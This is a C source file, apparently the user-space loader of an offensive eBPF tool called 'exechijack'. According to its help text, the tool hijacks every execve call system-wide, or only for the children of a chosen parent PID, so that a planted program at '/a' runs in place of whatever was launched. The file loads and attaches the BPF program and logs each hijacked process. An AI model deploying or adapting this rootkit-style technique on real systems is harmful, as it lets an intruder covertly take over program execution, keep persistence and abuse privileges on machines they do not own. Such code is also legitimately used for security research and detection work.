// SPDX-License-Identifier: BSD-3-Clause
#include <argp.h>
#include <unistd.h>
#include "exechijack.skel.h"
#include "common_um.h"
#include "common.h"

// Setup Argument stuff
static struct env {
    int pid_to_hide;
    int target_ppid;
} env;

const char *argp_program_version = "exechijack 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"Exec Hijack\n"
"\n"
"Hijacks all calls to execve to instead run program '/a'\n"
"\n"
"USAGE: First put any executable or script at '/a'. \n"
"       (probably best to make it executable by everyone)\n"
"Then run: ./exechijack [-t 1111]\n";

static const struct argp_option opts[] = {
    { "target-ppid", 't', "PPID", 0, "Optional Parent PID, will only affect its children." },
    {},
};
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hijacked PID %d to run '/a' instead of '%s'\n", e->pid, e->comm);
    else
        printf("Failed to hijack PID %d to run '/a' instead of '%s'\n", e->pid, e->comm);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct exechijack_bpf *skel;
    int err;

    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) {
        return err;
    }

    // Do common setup
    if (!setup()) {
        exit(1);
    }

    // Check the hijackee file exists
    const char* hijackee_filename = "/a";
    if( access(hijackee_filename, F_OK ) != 0 ) {
        printf("Erorr, make sure there is an executable file located at '%s' \n", hijackee_filename);
        exit(1);
    }

    // Open BPF application 
    skel = exechijack_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Set target pid if using
    skel->rodata->target_ppid = env.target_ppid;

    // Verify and load program
    err = exechijack_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

    // Attach tracepoint handler 
    err = exechijack_bpf__attach( skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    // Set up ring buffer
    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    printf("Successfully started!\n");
    printf("Hijacking execve to run '/a' instead\n");
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    exechijack_bpf__destroy( skel);
    return -err;
}
